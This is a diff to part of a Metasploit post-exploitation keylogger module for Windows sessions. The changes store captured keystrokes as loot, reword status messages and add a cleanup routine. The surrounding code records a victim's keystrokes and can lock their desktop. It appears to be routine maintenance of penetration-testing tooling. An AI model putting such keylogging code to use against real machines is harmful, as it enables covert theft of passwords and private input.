@@ -75,31 +75,24 @@ class Metasploit3 < Msf::Post
 			end
 
 		end
+		
 		if startkeylogger
 			keycap(datastore['INTERVAL'],set_log)
 		end
 	end
 
-	# Method for creation of log file
+	# Returns the path name to the stored loot filename 
 	def set_log
-		logs = ::File.join(Msf::Config.log_directory,'post','keylog_recorder')
-		filenameinfo = sysinfo['Computer'] + "_" + ::Time.now.strftime("%Y%m%d.%M%S")
-		# Create the log directory
-		::FileUtils.mkdir_p(logs)
-
-		#logfile name
-		logfile = logs + ::File::Separator + filenameinfo + ".txt"
-
-		return logfile
+		store_loot("host.windows.keystrokes", "text/plain", session, "", "keystrokes.txt", "User Keystrokes")	
 	end
 
 	def lock_screen
-		print_status("Locking Screen...")
+		print_status("Locking the desktop...")
 		lock_info = session.railgun.user32.LockWorkStation()
 		if lock_info["GetLastError"] == 0
 			print_status("Screen has been locked")
 		else
-			print_error("Screen lock Failed")
+			print_error("Screen lock failed")
 		end
 	end
 
@@ -185,7 +178,7 @@ class Metasploit3 < Msf::Post
 
 		sleep(2)
 		if not outp.empty?
-			print_good("keystrokes captured #{outp}") if datastore['ShowKeystrokes']
+			print_good("Keystrokes captured #{outp}") if datastore['ShowKeystrokes']
 			file_local_write(logfile,"#{outp}\n")
 		end
 	end
@@ -197,22 +190,22 @@ class Metasploit3 < Msf::Post
 			#Creating DB for captured keystrokes
 			print_status("Keystrokes being saved in to #{logfile}")
 			#Inserting keystrokes every number of seconds specified
-			print_status("Recording ")
+			print_status("Recording keystrokes...")
 			while rec == 1
-				#getting and writing Keystrokes
 				write_keylog_data(logfile)
-
 				sleep(keytime.to_i)
 			end
 		rescue::Exception => e
-			print_status "Saving last few keystrokes"
+			print_status "Saving last few keystrokes..."
 			write_keylog_data(logfile)
-
-			print("\n")
 			print_status("#{e.class} #{e}")
 			print_status("Stopping keystroke sniffer...")
 			session.ui.keyscan_stop
 		end
+	end
+
+	def cleanup
+		session.ui.keyscan_stop rescue nil
 	end
 
 end
